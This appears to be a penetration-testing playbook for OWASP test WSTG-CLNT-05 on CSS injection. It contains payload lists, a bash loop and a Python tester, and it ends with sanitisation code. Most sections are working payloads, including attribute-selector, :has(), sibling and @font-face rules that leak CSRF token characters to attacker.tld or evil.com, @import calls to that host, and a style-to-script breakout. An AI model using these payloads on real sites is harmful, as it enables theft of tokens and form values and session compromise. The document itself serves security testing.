---
name: wstg-clnt-05
description: "Testing for CSS Injection"
category: client-side
owasp_id: WSTG-CLNT-05
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-94]
chains_with: [wstg-clnt-03, wstg-clnt-01]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-01: "CSS injection that breaks out via `}</style><script>` lands in a DOM XSS sink = a data-exfiltration/UI-redress bug escalates to full script execution and session theft (Medium -> High)"
  wstg-clnt-03: "CSS Injection + HTML Injection = attacker controls both styling and markup, enabling a pixel-perfect credential-phishing overlay plus attribute-selector exfiltration of CSRF tokens/input values (Medium -> High)"
---

# wstg-clnt-05

## Test ID

WSTG-CLNT-05

## Test Name

Testing for CSS Injection

## High-Level Description

CSS injection allows attackers to inject malicious CSS into web pages. While typically less severe than XSS, it can be used for data exfiltration (via attribute selectors), UI redressing, content spoofing, and in some cases, JavaScript execution in older browsers.

---

## What to Check

- [ ] Style attribute injection
- [ ] CSS in user-controlled content
- [ ] @import directive injection
- [ ] expression() in IE
- [ ] Data exfiltration via CSS

---

## How to Test

### Step 1: Basic CSS Injection

```bash
#!/bin/bash
TARGET="https://target.com"

payloads=(
    "color:red"
    "background:url(https://evil.com/log?data=stolen)"
    "position:fixed;top:0;left:0;width:100%;height:100%;background:red"
    "}</style><script>alert(1)</script><style>"
)

for payload in "${payloads[@]}"; do
    response=$(curl -s "$TARGET/profile?style=$payload")
    echo "Testing: $payload"
done
```

### Step 2: Data Exfiltration via CSS

```css
/* CSS attribute selector exfiltration */
/* Can extract CSRF tokens, input values */

input[name="csrf"][value^="a"] {
  background: url(https://attacker.com/log?csrf=a);
}
input[name="csrf"][value^="b"] {
  background: url(https://attacker.com/log?csrf=b);
}
/* ... repeat for each character */
```

### Step 3: CSS Injection Testing Script

```python
#!/usr/bin/env python3
import requests

class CSSInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_style_injection(self, endpoint, param):
        """Test for CSS injection"""
        print(f"[*] Testing CSS injection: {endpoint}")

        payloads = [
            ("color:red", "color:red"),
            ("background:url(//evil.com)", "background:url"),
            ("</style><script>alert(1)</script>", "<script>"),
        ]

        for payload, check in payloads:
            url = f"{self.base_url}{endpoint}"
            response = requests.get(url, params={param: payload})

            if check in response.text:
                print(f"[VULN] CSS injection: {payload[:30]}")
                self.findings.append({
                    "endpoint": endpoint,
                    "payload": payload,
                    "severity": "Medium"
                })

# Usage
tester = CSSInjectionTester("https://target.com")
tester.test_style_injection("/profile", "theme")
```

---

## Tools

| Tool               | Purpose                                          |
| ------------------- | --------------------------------------------------- |
| **Burp Suite**       | Fuzz style parameters, capture exfil callbacks        |
| **CSS Exfil Vector** | Generate attribute-selector CSS exfiltration payloads |
| **Browser DevTools** | Inspect computed styles / `<style>` injection point   |

---

## Example Commands/Payloads

### Basic injection payloads

```css
color:red
background:url(https://attacker.tld/log?data=stolen)
position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999
}</style><script>alert(document.domain)</script><style>
```

### Attribute-selector data exfiltration (CSRF token / input value theft)

```css
input[name="csrf"][value^="a"] { background: url(https://attacker.tld/log?csrf=a); }
input[name="csrf"][value^="b"] { background: url(https://attacker.tld/log?csrf=b); }
/* repeat for full charset per character position */
```

### curl probe

```bash
TARGET="https://{target}"
curl -s "$TARGET/profile?style=color:red;background:url(https://attacker.tld/x)"
```

### `:has()` selector exfiltration (styles a parent based on a child match — no sibling needed)

```css
div:has(input[name="csrf"][value^="a"]) {
  background: url(https://attacker.tld/log?csrf=a);
}
```

### Sibling-selector trick for hidden inputs (can't background a `type=hidden` element directly)

```css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://attacker.tld/log?q=a);
}
```

### `@font-face` unicode-range character-presence oracle (works even when `attr()`/selector exfil is blocked)

```html
<style>
@font-face{ font-family:poc; src: url(https://attacker.tld/?A); unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(https://attacker.tld/?B); unicode-range:U+0042; }
#sensitive{ font-family:poc; }
</style>
<!-- a GET to /?A on attacker.tld confirms the character "A" is present in #sensitive's text -->
```

### Blind CSS exfiltration via `@import` (no reload required, works cross-frame)

```html
<style>@import url(https://attacker.tld/staging?len=32);</style>
<style>@import '//attacker.tld';</style>
```

---

## Remediation

```python
# Sanitize CSS input - only allow safe properties
import re

ALLOWED_CSS = {
    'color': r'^#[0-9a-fA-F]{3,6}$|^(red|blue|green|black|white)$',
    'font-size': r'^\d+(px|em|rem)$',
    'background-color': r'^#[0-9a-fA-F]{3,6}$',
}

def sanitize_css(property_name, value):
    if property_name in ALLOWED_CSS:
        if re.match(ALLOWED_CSS[property_name], value):
            return f"{property_name}: {value}"
    return ""
```

---

## Risk Assessment

| Finding               | CVSS | Severity |
| --------------------- | ---- | -------- |
| CSS data exfiltration | 4.3  | Medium   |
| UI redressing via CSS | 3.5  | Low      |

---

## CWE Categories

| CWE ID     | Title                                                 |
| ---------- | ----------------------------------------------------- |
| **CWE-74** | Improper Neutralization of Special Elements in Output |


---

## References

- [OWASP WSTG - Testing for CSS Injection (WSTG-CLNT-05)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
- [PortSwigger - CSS injection](https://portswigger.net/web-security/css-injection)
- [CSS Exfil Vector project](https://github.com/mikesplain/css-exfil-protection)
- [PayloadsAllTheThings - CSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection)

---

## Checklist

```
[ ] Style attributes tested
[ ] CSS properties analyzed
[ ] Data exfiltration tested
[ ] XSS via CSS tested
[ ] Findings documented
```
